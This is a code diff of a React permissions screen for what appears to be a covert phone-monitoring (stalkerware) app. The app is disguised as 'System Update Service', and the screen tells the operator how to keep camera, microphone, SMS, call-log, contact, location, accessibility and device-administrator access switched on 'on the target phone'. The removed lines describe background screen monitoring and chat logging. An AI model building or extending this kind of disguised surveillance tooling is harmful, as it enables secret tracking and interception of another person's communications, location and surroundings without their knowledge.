@@ -1,40 +1,86 @@
 import React from 'react';
-import { ShieldCheck, CheckCircle2, AlertCircle } from 'lucide-react';
 
 export default function PermissionsCheck() {
   const permissions = [
-    { name: 'Accessibility Service', status: 'Active', desc: 'Allows background system events log' },
-    { name: 'Location Access', status: 'Active', desc: 'Allows precise background location log' },
-    { name: 'Screen Capture Permission', status: 'Active', desc: 'Allows background screen monitoring' },
-    { name: 'Notification Listener', status: 'Active', desc: 'Allows chat messages alerts log' },
-    { name: 'Camera & Mic Access', status: 'Warning', desc: 'Required for real-time surroundings and camera take photos' }
+    {
+      name: 'Access Camera',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > Camera > make sure it\'s on'
+    },
+    {
+      name: 'Accessibility',
+      status: 'On',
+      path: 'Go to Settings > Accessibility > System Update Service > make sure it\'s on'
+    },
+    {
+      name: 'Administrator',
+      status: 'On',
+      path: 'Go to Settings > find Security > Other security settings > Device administrator > System Update Service > make sure it\'s on'
+    },
+    {
+      name: 'Calendar',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > Calendar > make sure it\'s on'
+    },
+    {
+      name: 'Call Logs',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > Call logs > make sure it\'s on'
+    },
+    {
+      name: 'Contacts',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > Contacts > make sure it\'s on'
+    },
+    {
+      name: 'Locations',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > Locations > make sure it\'s on'
+    },
+    {
+      name: 'Microphone',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > Microphone > make sure i t\'s on'
+    },
+    {
+      name: 'Notification',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > Notifications > make sure it\'s on'
+    },
+    {
+      name: 'SMS',
+      status: 'On',
+      path: 'Go to Settings > Apps > find System Update Service > Permissions > SMS > make sure it\'s on'
+    }
   ];
 
   return (
     <div className="bg-white rounded-2xl shadow-xs border border-slate-200/80 p-6 min-h-[720px] flex flex-col space-y-6">
-      <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
-        <ShieldCheck className="w-5 h-5 text-cyan-500" />
-        <h2 className="text-xs font-bold text-slate-800 uppercase tracking-wider">Device Permissions Check</h2>
+      {/* Top Header warning description text banner */}
+      <div className="bg-slate-50 border border-slate-200/60 rounded-xl p-4 text-xs text-slate-500 leading-relaxed font-semibold">
+        If the app is not working properly on the target phone, it may be that the permission is turned off. Go to Settings and enable them again to make the app function again.
       </div>
 
-      <div className="divide-y divide-slate-100 flex-1 overflow-y-auto">
-        {permissions.map((perm, idx) => (
-          <div key={idx} className="py-4 flex items-center justify-between hover:bg-slate-50/40 px-2 rounded-lg transition-colors">
-            <div className="space-y-1">
-              <p className="text-xs font-bold text-slate-800">{perm.name}</p>
-              <p className="text-[10px] text-slate-400">{perm.desc}</p>
-            </div>
-
-            <span className={`text-[10px] font-bold px-2 py-0.5 rounded-md flex items-center space-x-1 ${
-              perm.status === 'Active'
-                ? 'bg-green-50 text-green-600'
-                : 'bg-amber-50 text-amber-600'
-            }`}>
-              {perm.status === 'Active' ? <CheckCircle2 className="w-3 h-3" /> : <AlertCircle className="w-3 h-3" />}
-              <span>{perm.status}</span>
-            </span>
-          </div>
-        ))}
+      {/* Permissions table log */}
+      <div className="overflow-x-auto flex-1">
+        <table className="w-full text-left border-collapse border border-slate-200 rounded-lg overflow-hidden">
+          <thead>
+            <tr className="border-b border-slate-200 text-[11px] font-bold text-slate-500 uppercase tracking-wider bg-slate-50">
+              <th className="py-3 px-4 border-r border-slate-200">Permissions</th>
+              <th className="py-3 px-4 border-r border-slate-200">Status</th>
+              <th className="py-3 px-4">Path</th>
+            </tr>
+          </thead>
+          <tbody className="divide-y divide-slate-200 text-xs text-slate-700">
+            {permissions.map((perm, idx) => (
+              <tr key={idx} className="hover:bg-slate-50/50 transition-colors">
+                <td className="py-3.5 px-4 font-bold text-slate-800 border-r border-slate-200 max-w-[200px]">{perm.name}</td>
+                <td className="py-3.5 px-4 font-bold text-green-600 border-r border-slate-200">{perm.status}</td>
+                <td className="py-3.5 px-4 text-slate-500 leading-relaxed">{perm.path}</td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
       </div>
     </div>
   );
